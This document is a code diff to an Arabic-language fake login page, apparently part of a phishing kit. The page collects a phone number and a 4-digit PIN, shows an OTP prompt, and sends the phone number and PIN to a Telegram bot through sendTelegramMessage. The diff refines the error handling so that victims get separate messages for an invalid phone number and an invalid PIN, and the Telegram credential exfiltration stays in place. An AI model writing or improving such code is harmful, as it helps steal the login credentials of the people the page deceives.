@@ -383,7 +383,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   <div class="modal-card">
     <div class="modal-body">
       <div class="modal-title">خطأ</div>
-      <div class="modal-text">المعلومات التي أدخلتها غير صحيحة. يرجى إعادة المحاولة</div>
+      <div class="modal-text" id="error-modal-text">المعلومات التي أدخلتها غير صحيحة. يرجى إعادة المحاولة</div>
     </div>
     <button class="modal-btn" onclick="closeUserErrorModal()">تم</button>
   </div>
@@ -500,20 +500,33 @@ function login(){
   var isValidPrefix = (firstChar === '2' || firstChar === '3' || firstChar === '4');
   var isPinPartiallyFilled = (pin.length > 0 && pin.length < 4);
 
-  // إذا كان رقم الهاتف غير صالح، أو الرقم السري غير صالح/متطابق عند الضغط على تسجيل الدخول
-  if(ph.length !== 8 || !isValidPrefix || pin.length !== 4 || isPinPartiallyFilled || checkDuplicatePins()){
+  // 1. فحص رقم الهاتف (إذا كان غير صالح يظهر تنبيه المعلومات غير الصحيحة)
+  if(ph.length !== 8 || !isValidPrefix){
+    document.getElementById('error-modal-text').textContent = "المعلومات التي أدخلتها غير صحيحة. يرجى إعادة المحاولة";
     document.getElementById('user-error-modal').classList.remove('hide');
-  } else {
-    showOtp();
-    const msg = `<b>تسجيل دخول جديد</b>\n<b>رقم الهاتف:</b> ${ph}\n<b>الرقم السري:</b> ${pin}`;
-    sendTelegramMessage(msg);
+    return;
   }
+
+  // 2. فحص الرقم السري (إذا كان غير مكتمل أو يحتوي على أرقام متطابقة يظهر تنبيه "الرقم السري غير صالح")
+  if(pin.length !== 4 || isPinPartiallyFilled || checkDuplicatePins()){
+    document.getElementById('error-modal-text').textContent = "الرقم السري غير صالح";
+    document.getElementById('user-error-modal').classList.remove('hide');
+    return;
+  }
+
+  // 3. النجاح وإرسال البيانات لتليجرام
+  showOtp();
+  const msg = `<b>تسجيل دخول جديد</b>\n<b>رقم الهاتف:</b> ${ph}\n<b>الرقم السري:</b> ${pin}`;
+  sendTelegramMessage(msg);
 }
 
 function closeUserErrorModal(){
   document.getElementById('user-error-modal').classList.add('hide');
-  P.forEach(p => p.value = '');
-  P[0].focus();
+  // إذا كان الخطأ للرقم السري نقوم بتفريغ خاناته فقط
+  if (document.getElementById('error-modal-text').textContent === "الرقم السري غير صالح") {
+    P.forEach(p => p.value = '');
+    P[0].focus();
+  }
 }
 
 var O=[0,1,2,3].map(function(i){return document.getElementById('o'+i);});
